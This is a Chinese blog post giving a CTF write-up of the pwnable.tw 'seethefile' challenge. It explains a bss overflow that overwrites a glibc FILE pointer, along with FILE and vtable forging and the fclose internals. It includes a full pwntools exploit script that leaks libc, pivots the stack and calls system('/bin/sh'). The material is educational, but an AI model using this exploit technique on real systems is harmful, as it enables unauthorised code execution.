<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">

  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
  <link rel="manifest" href="/images/site.webmanifest">
  <link rel="shortcut icon" href="/images/favicon.ico">

  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>pwnable.tw seethefile | Y² 的博客</title>
<meta name="generator" content="Jekyll v3.10.0" />
<meta property="og:title" content="pwnable.tw seethefile" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。" />
<meta property="og:description" content="借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。" />
<link rel="canonical" href="http://localhost:4001/2023/05/07/pwnable-tw-seethefile-writeup.html" />
<meta property="og:url" content="http://localhost:4001/2023/05/07/pwnable-tw-seethefile-writeup.html" />
<meta property="og:site_name" content="Y² 的博客" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-05-07T20:44:10+08:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="pwnable.tw seethefile" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-05-07T20:44:10+08:00","datePublished":"2023-05-07T20:44:10+08:00","description":"借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。","headline":"pwnable.tw seethefile","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4001/2023/05/07/pwnable-tw-seethefile-writeup.html"},"url":"http://localhost:4001/2023/05/07/pwnable-tw-seethefile-writeup.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4001/feed.xml" title="Y² 的博客" /><script src="//unpkg.com/valine/dist/Valine.min.js"></script>
</head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">Y² 的博客</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/links/">Links</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">pwnable.tw seethefile</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2023-05-07T20:44:10+08:00" itemprop="datePublished">May 7, 2023
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <p>借本题入门了glibc的FILE相关机制，果然一切涉及到函数指针的设计都是灵活但危险的。</p>

<p>本题相关：FILE伪造、vtable伪造、fclose</p>

<hr />

<h2 id="漏洞分析">漏洞分析</h2>

<p>保护情况：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</code></pre></div></div>

<p>程序大致是一个menu，可以选择以下几种功能：</p>
<ol>
  <li>open：指定文件名打开文件，将FILE*保存到bss段的fp（不允许文件名中含有flag子字符串）</li>
  <li>read：从fp中读取0x18F个字节，并保存到bss段的magic_buffer中</li>
  <li>write：将magic_buffer中的内容打印到屏幕上（不允许内容中含有flag、}）</li>
  <li>close：关闭fp</li>
  <li>exit：往bss读取一串字符串（name）后，尝试fclose(fp)并退出</li>
</ol>

<p>程序漏洞点有两个：</p>
<ol>
  <li>main函数读取选项时，使用了 <code class="language-plaintext highlighter-rouge">scanf("%s", buf)</code>，其中buf是一个栈变量。</li>
  <li>main函数在exit读取name时，也使用了 <code class="language-plaintext highlighter-rouge">scanf("%s", name)</code>，其中name在bss段上，且fp在它的后面。</li>
</ol>

<p>由于main函数没有ret，只有exit，因此我们没办法使用第一个漏洞来劫持程序控制流。
但第二个漏洞非常有用，我们可以通过溢出name来覆写fp指针，通过伪造FILE结构体和vtable的方式，我们可以让fclose调用某个给定的地址的代码，从而劫持程序控制流。</p>

<p>此外，还有一个不太算漏洞的疏忽，就是我们可以通过读取 <code class="language-plaintext highlighter-rouge">/proc/self/maps</code> 来得到程序各个段的地址。虽然read一次只能读取0x18F个字节，但是由于文件流在下一次读取时会接着读，所以我们是可以获取完整的文件内容的。</p>

<h2 id="file-结构体分析">FILE 结构体分析</h2>

<p>在glibc中，有三个初始文件流直接位于glibc的数据段，是stdin、stdout和stderr。当用户使用fopen打开新的文件时，FILE结构体会使用malloc分配到程序的堆上。</p>

<p>FILE结构体的定义位于 <code class="language-plaintext highlighter-rouge">libio/libio.h</code>，在2.23-0ubuntu3版本中如下：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="p">{</span>
  <span class="kt">int</span> <span class="n">_flags</span><span class="p">;</span>		<span class="cm">/* High-order word is _IO_MAGIC; rest is flags. */</span>
<span class="cp">#define _IO_file_flags _flags
</span>
  <span class="cm">/* The following pointers correspond to the C++ streambuf protocol. */</span>
  <span class="cm">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_ptr</span><span class="p">;</span>	<span class="cm">/* Current read pointer */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_end</span><span class="p">;</span>	<span class="cm">/* End of get area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_read_base</span><span class="p">;</span>	<span class="cm">/* Start of putback+get area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_base</span><span class="p">;</span>	<span class="cm">/* Start of put area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_ptr</span><span class="p">;</span>	<span class="cm">/* Current put pointer. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_write_end</span><span class="p">;</span>	<span class="cm">/* End of put area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_base</span><span class="p">;</span>	<span class="cm">/* Start of reserve area. */</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">_IO_buf_end</span><span class="p">;</span>	<span class="cm">/* End of reserve area. */</span>
  <span class="cm">/* The following fields are used to support backing up and undo. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_base</span><span class="p">;</span> <span class="cm">/* Pointer to start of non-current get area. */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_backup_base</span><span class="p">;</span>  <span class="cm">/* Pointer to first valid character of backup area */</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">_IO_save_end</span><span class="p">;</span> <span class="cm">/* Pointer to end of non-current get area. */</span>

  <span class="k">struct</span> <span class="n">_IO_marker</span> <span class="o">*</span><span class="n">_markers</span><span class="p">;</span>

  <span class="k">struct</span> <span class="n">_IO_FILE</span> <span class="o">*</span><span class="n">_chain</span><span class="p">;</span>

  <span class="kt">int</span> <span class="n">_fileno</span><span class="p">;</span>
<span class="c">#if 0
  int _blksize;
#else</span>
  <span class="kt">int</span> <span class="n">_flags2</span><span class="p">;</span>
<span class="cp">#endif
</span>  <span class="n">_IO_off_t</span> <span class="n">_old_offset</span><span class="p">;</span> <span class="cm">/* This used to be _offset but it's too small.  */</span>

<span class="cp">#define __HAVE_COLUMN </span><span class="cm">/* temporary */</span><span class="cp">
</span>  <span class="cm">/* 1+column number of pbase(); 0 is unknown. */</span>
  <span class="kt">unsigned</span> <span class="kt">short</span> <span class="n">_cur_column</span><span class="p">;</span>
  <span class="kt">signed</span> <span class="kt">char</span> <span class="n">_vtable_offset</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">_shortbuf</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>

  <span class="cm">/*  char* _save_gptr;  char* _save_egptr; */</span>

  <span class="n">_IO_lock_t</span> <span class="o">*</span><span class="n">_lock</span><span class="p">;</span>
<span class="cp">#ifdef _IO_USE_OLD_IO_FILE
</span><span class="p">};</span>
</code></pre></div></div>

<p>不过完整的FILE结构还多一个word，用来存放一个函数指针表vtable，这是为了与C++的streambuf兼容，在 <code class="language-plaintext highlighter-rouge">libio/libioP.h</code> 中可以找到其定义：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* We always allocate an extra word following an _IO_FILE.
   This contains a pointer to the function jump table used.
   This is for compatibility with C++ streambuf; the word can
   be used to smash to a pointer to a virtual function table. */</span>

<span class="k">struct</span> <span class="n">_IO_FILE_plus</span>
<span class="p">{</span>
  <span class="n">_IO_FILE</span> <span class="n">file</span><span class="p">;</span>
  <span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="o">*</span><span class="n">vtable</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="n">_IO_jump_t</span>
<span class="p">{</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="kt">size_t</span><span class="p">,</span> <span class="n">__dummy2</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_finish_t</span><span class="p">,</span> <span class="n">__finish</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_overflow_t</span><span class="p">,</span> <span class="n">__overflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__underflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_underflow_t</span><span class="p">,</span> <span class="n">__uflow</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_pbackfail_t</span><span class="p">,</span> <span class="n">__pbackfail</span><span class="p">);</span>
    <span class="cm">/* showmany */</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsputn_t</span><span class="p">,</span> <span class="n">__xsputn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_xsgetn_t</span><span class="p">,</span> <span class="n">__xsgetn</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekoff_t</span><span class="p">,</span> <span class="n">__seekoff</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seekpos_t</span><span class="p">,</span> <span class="n">__seekpos</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">,</span> <span class="n">__setbuf</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_sync_t</span><span class="p">,</span> <span class="n">__sync</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_doallocate_t</span><span class="p">,</span> <span class="n">__doallocate</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_read_t</span><span class="p">,</span> <span class="n">__read</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_write_t</span><span class="p">,</span> <span class="n">__write</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_seek_t</span><span class="p">,</span> <span class="n">__seek</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_close_t</span><span class="p">,</span> <span class="n">__close</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_stat_t</span><span class="p">,</span> <span class="n">__stat</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_showmanyc_t</span><span class="p">,</span> <span class="n">__showmanyc</span><span class="p">);</span>
    <span class="n">JUMP_FIELD</span><span class="p">(</span><span class="n">_IO_imbue_t</span><span class="p">,</span> <span class="n">__imbue</span><span class="p">);</span>
<span class="c">#if 0
    get_column;
    set_column;
#endif
</span><span class="p">};</span>
</code></pre></div></div>

<h2 id="fclose-分析">fclose 分析</h2>

<p>声明在 <code class="language-plaintext highlighter-rouge">include/stdio.h</code> 中：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">extern</span> <span class="kt">int</span> <span class="nf">_IO_new_fclose</span> <span class="p">(</span><span class="n">_IO_FILE</span><span class="o">*</span><span class="p">);</span>
<span class="cp">#   define fclose(fp) _IO_new_fclose (fp)
</span></code></pre></div></div>

<p>定义在 <code class="language-plaintext highlighter-rouge">libio/iofclose.c</code> 中，比较重要的是下面几行：</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* First unlink the stream.  */</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_file_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_FILEBUF</span><span class="p">)</span>
    <span class="n">_IO_un_link</span> <span class="p">((</span><span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">);</span>

  <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_IO_file_flags</span> <span class="o">&amp;</span> <span class="n">_IO_IS_FILEBUF</span><span class="p">)</span>
    <span class="n">status</span> <span class="o">=</span> <span class="n">_IO_file_close_it</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">status</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_ERR_SEEN</span> <span class="o">?</span> <span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
  <span class="n">_IO_FINISH</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
</code></pre></div></div>

<p>与lock相关的代码实在是太复杂了，现在的我还没有宏孩儿的功力，因此只能暂且作罢。事实证明这题里面不用管它。</p>

<p>那么有两种攻击方法：一种是通过_IO_file_close_it调用vtable中的 <code class="language-plaintext highlighter-rouge">__close</code>；一种是通过_IO_FINISH（定义见下）调用vtable中的 <code class="language-plaintext highlighter-rouge">__finish</code>。</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define _IO_FINISH(FP) JUMP1 (__finish, FP, 0)
</span></code></pre></div></div>

<p>我使用的是后者，因为比较简单，但第一个方法看上去也是非常可行的。
具体来说，只要把 <code class="language-plaintext highlighter-rouge">_IO_IS_FILEBUF</code> flag置零，就可以跳过unlink和close_it，调用到finish。</p>

<h2 id="漏洞利用">漏洞利用</h2>

<p>既然栈上可以随便溢出，那我就寻思着想办法来个ROP！
我们可以使用上述方法劫持程序控制流来执行一次给定地址的代码，因此我的思路就是找一个长得像这样的gadget，直接将栈“迁移”到我可以控制的位置：<code class="language-plaintext highlighter-rouge">add esp, xxx; ret</code></p>

<p>在本地调试时，在调用 <code class="language-plaintext highlighter-rouge">__finish</code> 后的第一条指令处停下，然后查看此时栈的情况：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pwndbg&gt; stack 30
00:0000│ esp 0xffffcafc —▸ 0xf7e79fa8 (fclose+232) ◂— mov edx, dword ptr [esi + 0x68]
01:0004│     0xffffcb00 —▸ 0x804c410 ◂— 0xfbad240c
02:0008│     0xffffcb04 ◂— 0x0
03:000c│     0xffffcb08 —▸ 0xf7e5ebcb (vfprintf+11) ◂— add ebx, 0x16e435
04:0010│     0xffffcb0c ◂— 0x0
05:0014│     0xffffcb10 —▸ 0xf7fe76eb (_dl_fixup+11) ◂— add esi, 0x15915
06:0018│     0xffffcb14 ◂— 0x0
07:001c│     0xffffcb18 —▸ 0xf7fcd000 ◂— 0x1afdb0
08:0020│     0xffffcb1c —▸ 0xf7fcd000 ◂— 0x1afdb0
09:0024│     0xffffcb20 —▸ 0xffffcb88 ◂— 0x0
0a:0028│     0xffffcb24 —▸ 0xf7fedf10 (_dl_runtime_resolve+16) ◂— pop edx
0b:002c│     0xffffcb28 —▸ 0xf7e79ecb (fclose+11) ◂— add ebx, 0x153135
0c:0030│     0xffffcb2c ◂— 0x0
0d:0034│     0xffffcb30 —▸ 0xf7fcd000 ◂— 0x1afdb0
0e:0038│     0xffffcb34 —▸ 0xf7fcd000 ◂— 0x1afdb0
0f:003c│ ebp 0xffffcb38 —▸ 0xffffcb88 ◂— 0x0
10:0040│     0xffffcb3c —▸ 0x8048b14 (main+221) ◂— add esp, 0x10
11:0044│     0xffffcb40 —▸ 0x804c410 ◂— 0xfbad240c
12:0048│     0xffffcb44 —▸ 0x804b260 (name) ◂— '114514'
13:004c│     0xffffcb48 —▸ 0xffffcb88 ◂— 0x0
14:0050│     0xffffcb4c —▸ 0x8048a62 (main+43) ◂— sub esp, 8
15:0054│     0xffffcb50 ◂— 0x1
16:0058│     0xffffcb54 ◂— 0x8000
17:005c│     0xffffcb58 ◂— 0x5
18:0060│     0xffffcb5c ◂— '5aaaaaaabbbbbbbbccccccccdddddddd'
</code></pre></div></div>

<p>可以发现，此时esp和可控的位置之间相差了 0x60 个字节。于是我在libc中找到了这个gadget：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 0x0005ae90 : xor eax, eax ; add esp, 0x6c ; ret
</code></pre></div></div>

<p>有了这个gadget，我们就可以愉快地ROP了！直接 system(“/bin/sh”) 就行。</p>

<h3 id="结构体伪造">结构体伪造</h3>

<p>首先要伪造的是FILE结构体，其中我们需要关注的是flags字段和vtable字段。使用pwntools的API可以超级方便地完成这一步：</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1"># fake file
</span>    <span class="n">fileStr</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">()</span>
    <span class="n">fileStr</span><span class="p">.</span><span class="n">flags</span><span class="o">=</span><span class="mh">0xffffdfff</span>    <span class="c1"># no _IO_IS_FILEBUF
</span>    <span class="n">fileStr</span><span class="p">.</span><span class="n">vtable</span><span class="o">=</span><span class="mh">0x0804B260</span>   <span class="c1"># name
</span></code></pre></div></div>

<p>根据vtable的定义，<code class="language-plaintext highlighter-rouge">__finish</code> 位于第三个指针处，在32位下就是0x8偏移处，因此我把它就直接放在name的地方。</p>

<p>最终伪造目标是这样（Fake Vtable除了__finish以外的值都不需要关心，因此我随意地在这里放了一个/bin/sh字符串）：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Name ─────►┌─────────────────┐ ─┬─
     Fake  │/bin/sh\0        │  │
     Vtable├────────┬────────┤  │
           │__finish│        │  │
           ├────────┴────────┤  │ 0x20
           │                 │  │
           │                 │  │
           │                 │  │
  fp ─────►├────────┬────────┤ ─┴─
           │fp+0x10 │        │
           ├────────┘        │
           │                 │
     ─────►├─────────────────┤
     Fake  │ Flag            │
     FILE

           ├─────────────────┤
           │(vtable)&amp;name    │
           └─────────────────┘
</code></pre></div></div>

<h3 id="exp脚本">EXP脚本</h3>

<p>细节：泄露libc时，由于buffer长度问题，libc基址不会在第一次就读取出来。但是我发现这一地址就是libc基址减去0x1000的偏移，因此我在这里加上0x1000就可以完成泄露。（一开始没发现这个，一位这个地址就是libc基址，因此卡了好久好久……）</p>

<p>最后输入选项的时候，payload以5开头，后面是ROP gadget。这样 <code class="language-plaintext highlighter-rouge">atoi(payload)</code> 的结果就是5，也就是选择exit功能。</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># 0x0005ae90 : xor eax, eax ; add esp, 0x6c ; ret
</span>
<span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>

    <span class="c1"># leak libc_addr
</span>    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"1"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"see"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"/proc/self/maps"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"2"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="sa">b</span><span class="s">"3"</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"[heap]</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">io</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s">"-"</span><span class="p">)[:</span><span class="o">-</span><span class="mi">1</span><span class="p">].</span><span class="n">decode</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="mh">0x1000</span>
    <span class="n">success</span><span class="p">(</span><span class="s">"libc_base -&gt; "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
    <span class="c1"># libc_base = int(input("addr:"), 16)
</span>
    <span class="c1"># create rop chain
</span>    <span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"5"</span> <span class="o">+</span> <span class="sa">b</span><span class="s">"a"</span><span class="o">*</span><span class="mh">0xb</span>
    <span class="c1"># payload += pack(elf.symbols["puts"]) + pack(0) + pack(0x08048C90) # test
</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">])</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x0804B260</span><span class="p">)</span>

    <span class="c1"># fake file
</span>    <span class="n">fileStr</span> <span class="o">=</span> <span class="n">FileStructure</span><span class="p">()</span>
    <span class="n">fileStr</span><span class="p">.</span><span class="n">flags</span><span class="o">=</span><span class="mh">0xffffdfff</span>    <span class="c1"># no _IO_IS_FILEBUF
</span>    <span class="n">fileStr</span><span class="p">.</span><span class="n">vtable</span><span class="o">=</span><span class="mh">0x0804B260</span>

    <span class="n">name</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'/bin/sh</span><span class="se">\0</span><span class="s">'</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0005ae90</span><span class="p">)</span>  <span class="c1"># fake vtable
</span>    <span class="n">name</span> <span class="o">+=</span> <span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0x14</span>
    <span class="n">name</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="mh">0x0804B280</span><span class="o">+</span><span class="mh">0x10</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s">'a'</span><span class="o">*</span><span class="mh">0xc</span>  <span class="c1"># fake FILE pointer
</span>    <span class="n">name</span> <span class="o">+=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">fileStr</span><span class="p">)</span>
    
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"Your choice :"</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="n">io</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s">"name"</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p>后记：后来发现其实根本不用ROP，由于调用vtable中的函数时，参数就是自己的file pointer，所以只要在flag字段后面加上”;/bin/sh;”，然后把 <code class="language-plaintext highlighter-rouge">__finish</code> 设置成system地址，就可以直接get shell。见<a href="https://n0va-scy.github.io/2019/07/03/pwnable.tw/#seethefile">R4bb1t师傅的博客</a></p>

  </div>
    
      <b>本博客上与 pwnable.tw 相关的贴子：</b>
      <ul>
        
        
          <li><a href="/2023/10/24/pwnable-tw-BabyStack-writeup.html">pwnable.tw BabyStack</a></li>
        
          <li><a href="/2023/10/13/pwnable-tw-Starbound-writeup.html">pwnable.tw Starbound</a></li>
        
          <li><a href="/2023/05/07/pwnable-tw-seethefile-writeup.html">pwnable.tw seethefile</a></li>
        
          <li><a href="/2023/04/14/pwnable-tw-re-alloc.html">pwnable.tw Re-alloc</a></li>
        
          <li><a href="/2023/02/01/pwnable-tw-tcache-tear-writeup.html">pwnable.tw tcache_tear</a></li>
        
          <li><a href="/2022/09/08/pwnable-tw-applestore-writeup.html">pwnable.tw applestore</a></li>
        
          <li><a href="/2022/09/01/pwnable-tw-hacknote-writeup.html">pwnable.tw hacknote</a></li>
        
          <li><a href="/2022/08/07/pwnable-tw-silver-bullet-writeup.html">pwnable.tw silver_bullet</a></li>
        
          <li><a href="/2022/08/06/pwnable-tw-dubblesort-writeup.html">pwnable.tw dubblesort</a></li>
        
          <li><a href="/2022/08/04/pwnable-tw-3x17-writeup.html">pwnable.tw 3x17</a></li>
        
      </ul>
    
  

  <div id="comments"></div>
  <script>
  new Valine({
    el: "#comments",
    app_id: "Ji5y9HTOlb2QGDO0XFlWXNRy-gzGzoHsz",
    app_key: "6VqGye1352LX381YQDTOaiXs",
    placeholder: "El Psy Congroo",
  });
</script>


  <a class="u-url" href="/2023/05/07/pwnable-tw-seethefile-writeup.html" hidden></a>
</article>

      </div>
    </main><footer class="site-footer h-card">
  <data class="u-url" href="/"></data>

  <div class="wrapper">

    <h2 class="footer-heading">Y² 的博客</h2>

    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <ul class="contact-list">
          <li class="p-name">Y² 的博客</li><li><a class="u-email" href="mailto:cameudis@gmail.com">cameudis@gmail.com</a></li></ul>
      </div>

      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">cameudis</span></a></li><li><a href="https://www.twitter.com/cameudis"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">cameudis</span></a></li></ul>
</div>

      <div class="footer-col footer-col-3">
        <p>amor fati.</p>
      </div>
    </div>

  </div>

</footer>
</body>

</html>
